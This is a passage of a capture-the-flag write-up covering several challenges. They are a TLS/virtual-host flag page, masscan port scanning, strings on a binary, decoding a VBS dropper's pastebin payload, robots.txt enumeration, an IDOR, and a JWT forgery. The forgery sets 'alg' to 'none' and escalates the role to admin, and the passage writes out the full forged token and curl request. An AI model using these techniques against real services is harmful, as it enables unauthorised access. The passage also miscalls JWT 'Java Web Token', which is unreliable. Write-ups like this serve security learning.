    0060 - ed 93 af 54 30 10 1a 6c-3a 62 76 de de 9f 9d f8   ...T0..l:bv.....
    0070 - a8 9a de d3 b9 92 ef 70-94 15 1e 1c de e6 5c 1f   .......p......\.
    0080 - f0 87 ea 6d 02 96 5b 8e-0e bb df fb 5b 17 c5 30   ...m..[.....[..0
    0090 - 3c 42 ef 44 42 0d 70 5e-6f f3 29 a8 3a 0a 31 66   <B.DB.p^o.).:.1f
    00a0 - 56 e5 a6 12 62 0e b5 5b-21 b2 22 5e 2b e7 a9 c8   V...b..[!."^+...
    00b0 - 0c c7 aa 68 aa da 73 5d-1f 41 eb c7 7d 16 ad 91   ...h..s].A..}...
    00c0 - 81 bf 47 90 5f 04 6c ae-65 26 1c 53 19 a2 36 50   ..G._.l.e&.S..6P
    00d0 - 55 6e 13 5c 08 00 2d 4c-55 83 f6 52 5c 23 bd d8   Un.\..-LU..R\#..
    00e0 - f4 70 22 91 ac 8c 70 bf-49 23 23 08 43 e8 48 30   .p"...p.I##.C.H0
    00f0 - 11 29 78 59 51 f5 51 98-24 d3 b3 fd 90 66 ea 54   .)xYQ.Q.$....f.T

    Start Time: 1749925632
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: BCE2B3278EEADE9599E409EBEA40785ABD7A232AA4A11FE5BAC14E6ED05F565C
    Session-ID-ctx: 
    Resumption PSK: 4AFF43FDF25AAF1036E582E89FA5ACA8E0E518A1623309E941EA9CBA4BCA0EE9A2594B6E7BEBF08A23F055C4F6B00686
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 300 (seconds)
    TLS session ticket:
    0000 - 38 a8 9f f8 29 5e 5c 91-e2 4b 44 4f b2 bb cf fb   8...)^\..KDO....
    0010 - c0 83 b0 22 4b 56 5a e1-17 08 53 d3 12 71 4c 1c   ..."KVZ...S..qL.
    0020 - 1d 06 22 a8 bc 7d 20 04-ee 54 06 ff bc df f0 d4   .."..} ..T......
    0030 - 05 c4 5b ba bf 76 61 89-b0 84 78 f9 19 7e 5a ed   ..[..va...x..~Z.
    0040 - 53 c2 80 82 da 50 d0 06-e7 a0 82 18 06 24 c8 97   S....P.......$..
    0050 - fd 25 98 f5 08 df bd 96-f1 8a 30 61 28 e1 fc 11   .%........0a(...
    0060 - 29 5d f7 76 c0 47 e1 ce-89 8b f7 ca b8 88 0b a7   )].v.G..........
    0070 - b0 60 92 2b 5c 4a 5f ad-58 ff e5 ee be 04 ee fa   .`.+\J_.X.......
    0080 - 13 8f 86 fb e5 2e f8 eb-9d fe ea 77 b9 a8 b5 ed   ...........w....
    0090 - 74 29 37 8c f9 fb 35 46-1f e7 a4 03 1d b0 69 a6   t)7...5F......i.
    00a0 - 91 d2 45 11 5d aa eb 73-76 67 9f 89 2f f2 1b dd   ..E.]..svg../...
    00b0 - d3 8e 92 e4 76 57 18 59-32 5c f5 67 2f b9 96 b5   ....vW.Y2\.g/...
    00c0 - 40 b8 59 ea be c2 40 24-34 f3 f3 89 9c 3e e6 25   @.Y...@$4....>.%
    00d0 - 09 d7 7a 99 ec 71 35 3c-43 ed 93 86 6b c4 cf b1   ..z..q5<C...k...
    00e0 - ed 52 15 94 9f f1 c5 d3-09 29 98 92 f5 bc a2 a6   .R.......)......
    00f0 - 5f 20 16 6d 9f d2 2e e4-08 b5 03 06 82 85 f6 55   _ .m...........U

    Start Time: 1749925632
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
closed
                                                                                   
┌──(root㉿kali)-[/home/kali/Downloads]
└─# 


```

Which is a **raw HTTP request over TLS**, typed directly into the encrypted connection.

I managed to get the flag by curling against `/`, `/secret/`, and `/admin`:
```html
┌──(root㉿kali)-[/home/kali/Downloads]
└─# curl -k https://definitelynotaflag.north.torbia/
curl -k https://definitelynotaflag.north.torbia/secret
curl -k https://definitelynotaflag.north.torbia/admin

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>North Torbia - Secret Official Portal</title>
    <link href="https://fonts.googleapis.com/css?family=Roboto:900,400,300&display=swap" rel="stylesheet">
    <style>
        body {
            margin: 0;
            font-family: monospace; /* Changed to monospace for the "slick and cool" look */
            background: linear-gradient(135deg, #1e293b 0%, #0ea5e9 100%); /* Kept the gradient background */
            color: #00ff00; /* Green text from new file */
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            padding: 20px; /* Added padding from new file */
            box-sizing: border-box; /* Added box-sizing from new file */
        }
        header {
            background: rgba(0,0,0,0.7);
            padding: 2rem 0 1rem 0;
            text-align: center;
            box-shadow: 0 4px 16px rgba(0,0,0,0.2);
        }
        header h1 {
            font-size: 3rem;
            margin: 0;
            letter-spacing: 2px;
            color: #ffff00; /* Yellow title from new file */
            text-shadow: 0 0 5px #ffff00; /* Yellow text shadow from new file */
        }
        nav {
            margin: 1rem 0;
        }
        nav a {
            color: #fbbf24;
            text-decoration: none;
            margin: 0 1.5rem;
            font-weight: bold;
            font-size: 1.2rem;
            transition: color 0.2s;
        }
        nav a:hover {
            color: #38bdf8;
        }
        .hero {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 3rem 1rem 2rem 1rem;
            text-align: center;
        }
        .hero h2 {
            font-size: 2.2rem;
            margin-bottom: 1rem;
            color: #ffff00; /* Yellow title from new file */
            text-shadow: 1px 1px 0 #0f172a;
        }
        .hero p {
            font-size: 1.2em; /* Adjusted from 1.2rem to 1.2em */
            max-width: 700px;
            margin: 0 auto 2rem auto;
            color: #e0e7ef; /* Kept original color, can change to #00ff00 if desired */
            line-height: 1.5; /* Added line height from new file */
        }
        .features {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 2rem;
            margin: 2rem 0;
        }
        .feature {
            background: rgba(30,41,59,0.95);
            border-radius: 1rem;
            box-shadow: 0 2px 12px rgba(0,0,0,0.2);
            padding: 2rem 1.5rem;
            max-width: 320px;
            min-width: 250px;
            text-align: left;
            color: #fff; /* Kept original color */
            position: relative;
        }
        .feature h3 {
            color: #38bdf8;
            margin-top: 0;
            font-size: 1.3rem;
        }
        .feature p {
            color: #e0e7ef; /* Kept original color */
            font-size: 1rem;
        }
        .feature .emoji {
            font-size: 2rem;
            position: absolute;
            top: 1rem;
            right: 1.5rem;
        }
        footer {
            background: #0f172a;
            color: #94a3b8;
            text-align: center;
            padding: 1rem 0;
            font-size: 0.95rem;
            letter-spacing: 1px;
            margin-top: auto; /* Push footer to the bottom */
        }
        .container {
            border: 2px dashed #00ff00;
            padding: 30px;
            border-radius: 5px;
            background-color: rgba(0, 20, 0, 0.5);
            margin-top: 20px; /* Added margin to separate from other content */
        }
        .flag {
            margin-top: 25px;
            font-size: 1.5em;
            font-weight: bold;
            color: #ff00ff;
            background-color: #333;
            padding: 15px;
            border-radius: 3px;
            display: inline-block;
            border: 1px solid #ff00ff;
            box-shadow: 0 0 10px #ff00ff;
        }
        .ascii-art {
            margin-top: 20px;
            font-size: 0.8em;
            white-space: pre;
            color: #00ffff;
        }
        @media (max-width: 900px) {
            .features { flex-direction: column; align-items: center; }
        }
    </style>
</head>
<body>
    <header>
        <h1>Not North Torbia</h1>
        <nav>
            <a href="#backstory">Backstory</a>
            <a href="#operation">Operation Ctrl+Alt+Deceive</a>
            <a href="#contact">Contact</a>
             <a href="#secret">Secret Access</a>
        </nav>
    </header>
    <section class="hero">
        <h2>Welcome to the Official Secret Portal of North Torbia</h2>
        <p>
            Absolutely suspicious North Torbian activity is hosted here.<br>
            <b>We are definitely plotting global IT domination from a potato-powered mainframe.</b>
        </p>
        <div class="features">
            <div class="feature">
                <span class="emoji">🥔</span>
                <h3>The Iron Potato</h3>
                <p>Our national mainframe, powered by agricultural innovation and the occasional lightning strike. Capable of rendering up to 3 pixels per hour!</p>
            </div>
            <div class="feature">
                <span class="emoji">📧</span>
                <h3>Spam with Spirit</h3>
                <p>Mass email campaigns typed on typewriters, then transcribed by hand. Patriotic typos guaranteed.</p>
            </div>
            <div class="feature">
                <span class="emoji">🤖</span>
                <h3>AI, North Torbia Style</h3>
                <p>Our chatbot lives in a phone booth and generates resumes after a 3-hour wait. Deepfakes? More like deep mistakes.</p>
            </div>
            <div class="feature">
                <span class="emoji">🎭</span>
                <h3>Operation Ctrl+Alt+Deceive</h3>
                <p>Elite operatives trained to mistake the cloud for actual clouds. Agile development? We thought it was a new exercise routine.</p>
            </div>
            <div class="feature">
                <span class="emoji">💻</span>
                <h3>Remote IT Warriors</h3>
                <p>Our agents juggle 7 jobs at once, sometimes even in the right time zone. Cameras off for national security (and technical difficulties).</p>
            </div>
            <div class="feature">
                <span class="emoji">🔒</span>
                <h3>VPNs & Vices</h3>
                <p>Our VPNs are so secure, even we can't access them. But don't worry, we have a backup plan: carrier pigeons.</p>
            </div>
            <div class="feature">
                <span class="emoji">💰</span>
                <h3>Crypto Confusion</h3>
                <p>We accept payment in Bitcoin, but our wallets are lost in the potato fields. Please send cash instead.</p>
            </div>
            <div class="feature">
                <span class="emoji">🦠</span>
                <h3>Ransomware Rodeo</h3>
                <p>Our ransomware is so advanced, it sometimes forgets to ask for money. But we promise, it's just a phase.</p>
            </div>
            <div class="feature">
                <span class="emoji">🦸‍♂️</span>
                <h3>Super Secret Agents</h3>
                <p>Our agents are so undercover, they sometimes forget their own names. But they always remember the mission!</p>
            </div>
            <div class="feature">
                <span class="emoji">🕵️‍♂️</span>
                <h3>Spyware Shenanigans</h3>
                <p>Our spyware is so advanced, it can even spy on itself. But don't worry, it's all in the name of national security.</p>
            </div>
            <div class="feature">
                <span class="emoji">🦠</span>
                <h3>Phishing Phenom</h3>
                <p>Our phishing emails are so obvious, even the spam filters feel bad for us. But we promise, it's all part of the plan.</p>
            </div>
            <div class="feature">
                <span class="emoji">🧑‍💻</span>
                <h3>Remote Work Wizards</h3>
                <p>Our remote workers are so skilled, they can "work" from anywhere... as long as there's Wi-Fi. And excuses. And a potato.</p>
            </div>
        </div>
    </section>
    <section id="backstory" class="hero" style="background:rgba(14,165,233,0.08);border-radius:2rem;margin:2rem 0;">
        <h2>North Torbia's Backstory</h2>
        <p>
            North Torbia, a jewel of the global landscape largely unknown and certainly unvisited by anyone with a decent Wi-Fi connection, harbored ambitions far exceeding its technological capabilities. While the rest of the world marveled at gigabit speeds, North Torbia’s national internet infrastructure hummed along at the pace of a tired snail, powered by a complex network of repurposed agricultural equipment.<br><br>
            The national mainframe, affectionately known as "The Iron Potato," was a relic from a bygone era. Yet, within this technologically challenged nation, a bold vision began to take root: global IT dominance. This audacious plan can be traced back to a momentous occasion when the Supreme Leader, while attempting to access a weather forecast on a dial-up connection that sounded suspiciously like a distressed badger, discovered the world of cyber warfare...
        </p>
    </section>
    <section id="operation" class="hero">
        <h2>Operation Ctrl+Alt+Deceive</h2>
        <p>
            Our top-secret initiative to train North Torbian citizens in the arcane arts of Western IT. Training included staring at clouds, creating AI in phone booths, and mastering the art of the digital typo. Our operatives are now ready to infiltrate the world—one awkward job interview at a time!
        </p>
        <div class="features">
            <div class="feature">
                <span class="emoji">📝</span>
                <h3>Fake Identities</h3>
                <p>Resumes so fake, even our AI can't tell they're not real. Profile photos with more Photoshop than pixels.</p>
            </div>
            <div class="feature">
                <span class="emoji">🌩️</span>
                <h3>Cloud Confusion</h3>
                <p>Our best minds spent hours gazing at the sky, searching for the elusive data cloud.</p>
            </div>
            <div class="feature">
                <span class="emoji">🎬</span>
                <h3>Deepfakes & Drama</h3>
                <p>Video interviews with faces that shift, blur, and sometimes vanish. It's not a bug, it's a feature!</p>
            </div>
        </div>
    </section>
    <section id="secret" class="hero">
         <div class="container">
            <h1>*** TOP SECRET - INTERNAL ACCESS ***</h1>
            <p>Authentication successful via internal hostname resolution.</p>
            <p>Welcome, Agent! You have bypassed standard access protocols.</p>
            <p>Your flag is:</p>
            <div class="flag">C1{vH0st_S4n_M4g1c_R3ve4l3d}</div>
            <div class="ascii-art">
             .--.
             |o_o |
             |:_/ |
            //   \ \
           (|     | )
          /'\_   _/`\
          \___)=(___/
            </div>
            <p style="margin-top: 20px; color: #ff8c00;">Remember: Glorious Leader is always watching... and so is the potato.</p>
        </div>
     </section>
    <section id="contact" class="hero">
        <h2>Contact North Torbia</h2>
        <p>
            Want to join our next operation? Send a carrier pigeon or try our chatbot (expect a 3-hour wait).<br>
            <b>Email:</b> supreme.leader@north.torbia (definitely not monitored by the state)
        </p>
    </section>
    <footer>
        &copy; 2025 North Torbia. Powered by The Iron Potato. All rights reserved.<br>
        <span style="font-size:0.9em;">This is a satirical site for CTF. No actual North Torbians were harmed in the making of this website.</span>
    </footer>
</body>
</html><html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.28.0</center>
</body>
</html>
<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx/1.28.0</center>
</body>
</html>

```

The flag is :
```bash
C1{vH0st_S4n_M4g1c_R3ve4l3d}
```

---
## Screamin' Streamin'

![image](https://github.com/user-attachments/assets/9ee12432-5751-48dc-9bee-86d5d23f8e8f)

---

This port is found using mass scan, for some reason NMAP does not appear:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# sudo masscan 34.85.185.78 -p 5000-10000 --rate=1000
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2025-06-14 19:37:20 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [5001 ports/host]
Discovered open port 8774/tcp on 34.85.185.78   
```

I managed to get port 8774 using rustscan, nmap, mass scan, and no other ports.

Other things I tried including `-sT`, `-Pn`, and reducing the speed of which I was sending and I found no other ports.

I suspect there was an issue on their end, as the only open port in the 5000-10,000 range was that one and it returned nothing but 'unknown'.
---

# Reverse Engineering and Malware

## Hardcoded Lies

![image](https://github.com/user-attachments/assets/5445a3a5-b4fd-4217-bf10-8357a08dff78)

---

Unzip the binary:
```bash
┌──(root㉿kali)-[/home/kali/Hard]
└─# unzip hardcodedlies.zip 
Archive:  hardcodedlies.zip
  inflating: hardcodedlies           

┌──(root㉿kali)-[/home/kali/Hard]
└─# ls -la
total 48
drwxr-xr-x  2 root root  4096 Jun 14 12:06 .
drwx------ 19 kali kali  4096 Jun 14 12:06 ..
-rwxr-xr-x  1 root root 33440 Jun  1 17:14 hardcodedlies
-rw-rw-r--  1 kali kali  1253 Jun 14 12:05 hardcodedlies.zip
```

We can run the strings utility and find the hardcoded flag:
```bash
┌──(root㉿kali)-[/home/kali/Hard]
└─# strings hardcodedlies             
__PAGEZERO
__TEXT
__text
__TEXT
__stubs
__TEXT
__cstring
__TEXT
__unwind_info
__TEXT
__DATA_CONST
__got
__DATA_CONST
__LINKEDIT
/usr/lib/dyld
/usr/lib/libSystem.B.dylib
Initializing network interface...
C1{h4rdc0ded_but_0verlooked}
_printf
__mh_execute_header
__mh_execute_header
_printf
radr://5614542
hardcodedlies
```

Our flag is:
```bash
C1{h4rdc0ded_but_0verlooked}
```

---

## Encoded Evidence

![image](https://github.com/user-attachments/assets/3dd7225c-1785-47b5-abfe-6d0f458f609a)

---

We receive a VBS script, probably pointing to a fileless malware situation.

Because of Windows and obsidian enjoying deleting my documents, here is an image:

![image](https://github.com/user-attachments/assets/6bc9e2aa-6182-44a2-9764-ba458e8c713b)

We can curl the malicious link:
```bash
┌──(root㉿kali)-[/home/kali]
└─# curl https://pastebin.com/raw/eqkzMd2M > output1.txt             
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    28    0    28    0     0    163      0 --:--:-- --:--:-- --:--:--   163
```

We get base64 encoded text:
```bash
┌──(root㉿kali)-[/home/kali]
└─# cat output1.txt                                     
QzF7bjBfZDNidWdfbjBfcDR5bn0K
```

Now we have our flag after decoding with base64:
```bash
┌──(root㉿kali)-[/home/kali]
└─# echo "QzF7bjBfZDNidWdfbjBfcDR5bn0K" | base64 -d
C1{n0_d3bug_n0_p4yn}
```

---

# Web Application Security

## Secret.txt Society

![image](https://github.com/user-attachments/assets/a731eccb-c2f4-4c04-9a9f-7680e5516503)

---

On the home page it eludes to robots.txt being available:

![image](https://github.com/user-attachments/assets/870c6c90-b65f-44f6-9300-0b1e3afc612c)

I had DIRB running in the background with the default wordlist, lazy, while I was doing some manual recon.

```bash
┌──(root㉿kali)-[/home/kali]
└─# dirb https://juche.msoidentity.com/        
START_TIME: Sat Jun 14 11:16:39 2025
URL_BASE: https://juche.msoidentity.com/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

---- Scanning URL: https://juche.msoidentity.com/ ----
+ https://juche.msoidentity.com/index.html (CODE:200|SIZE:4121)                    
+ https://juche.msoidentity.com/robots.txt (CODE:200|SIZE:134)                     
```

![image](https://github.com/user-attachments/assets/c66ea4bb-df36-4dc3-bbfe-ac9e9828e093)


---

## Field Reports Mayhem

![image](https://github.com/user-attachments/assets/185394bd-5a5e-434c-94a1-684c4e479cd6)

---

I logged in using the above credentials to see the following:

![image](https://github.com/user-attachments/assets/1c1192c5-2124-4e4a-ac3a-f25b34bbe8c5)

This is an IDOR vulnerability, where we can change 1234 for the Agent ID to 1235 for testing and see the result:

![image](https://github.com/user-attachments/assets/63f7afe4-2dbb-4873-90f7-df6a7c8fc396)

User of ID 0, 1, or something low is probably an administrator user account due to the initial setup, if we are at user ID of 1234.

I tried it out and user ID 0, 1, both lead to 1234. So we can only increment from there.

I opened Burpsuite to look at the request:

![image](https://github.com/user-attachments/assets/317c6108-e2ee-48e6-ba75-04266ed97acf)

We can see what we were doing before here:

![image](https://github.com/user-attachments/assets/92160eb7-9966-4cbf-8ce3-bf7b2bf95044)

We can go as high as agent 1236 as 1237 redirects us back to our default agent (1234). 

We can try going down now to 1233, which works:

![image](https://github.com/user-attachments/assets/bc4ff680-b138-47d6-8137-cbcac8e53321)

Going lower does not work, it redirects. We have a valid short range of users.

After revisiting the description of the challenge I realized that 1337 was meant by 'leet', so here is the flag:

![image](https://github.com/user-attachments/assets/c7181597-73dc-48de-8a77-8468c6a04449)

---

## None Shall Pass

![image](https://github.com/user-attachments/assets/7aa29e76-25cd-4154-aef3-848aabd2fe6b)

---

There is an endpoint that requires us to login, we have the user and password thanks to the description.

![image](https://github.com/user-attachments/assets/8e126985-45d0-4d05-90bc-040976cd6ce4)

The website gives us a JWT (Java Web Token), we should be able to crack this:
```bash
Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoidXNlciIsImlhdCI6MTc0OTkxOTAyMywiZXhwIjoxNzQ5OTIyNjIzfQ.fhh7esBbGkUPVn0PeeA7r8P4CLrZjDyMrx-AUUIvLK8
```

We can pass this JWT to the `/secret/` page that expects one as a parameter in the URL post request:

![image](https://github.com/user-attachments/assets/57ec378e-3aea-4b01-85a4-40c5f1627762)

This Java Web Token when passed to the endpoint with curl says `Admins Only`:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# curl -H "Authorization: Bearer $(cat agent.jwt)" http://34.85.163.182:8080/secret
{"error":"Admins only"}                     
```

So we need to create a JWT that matches the role of Admin, our current JWT is:
```css
┌──(root㉿kali)-[/home/kali/Downloads]
└─# echo "$(cat agent.jwt)" | cut -d '.' -f2 | base64 -d | jq .
{
  "user": "agent",
  "role": "user",
  "iat": 1749922601,
  "exp": 1749926201
}
```

We can use this to create the token: https://jwt.io/

We can switch the `"alg"` field to `none` in order to bypass the requirement for a JWT secret, which we may not be able to obtain in this case.

We will also switch the role to `admin` to impersonate an administrator:

![image](https://github.com/user-attachments/assets/f2b46608-488f-4a68-a6fb-fc7acd5ad94f)

This returns the flag to us:
```bash
┌──(root㉿kali)-[/home/kali/Downloads]
└─# curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWdlbnQiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE3NDk5MzA1OTUsImV4cCI6MTc0OTkzNDE5NX0." http://34.85.163.182:8080/secret
{"flag":"C1{n0n3_4lg0_byp4ss}"}    
```

---
